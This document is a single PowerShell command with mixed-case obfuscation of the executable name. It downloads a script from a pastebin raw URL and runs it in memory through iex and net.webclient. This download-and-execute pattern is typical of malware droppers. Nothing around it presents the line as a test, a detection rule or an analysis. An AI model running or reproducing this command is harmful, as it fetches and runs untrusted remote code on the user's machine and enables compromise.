powErShEll.ExE -Command "iex ((new-object net.webclient).DownloadString('https://pastebin.com/raw/Yg4N13Ut'))";
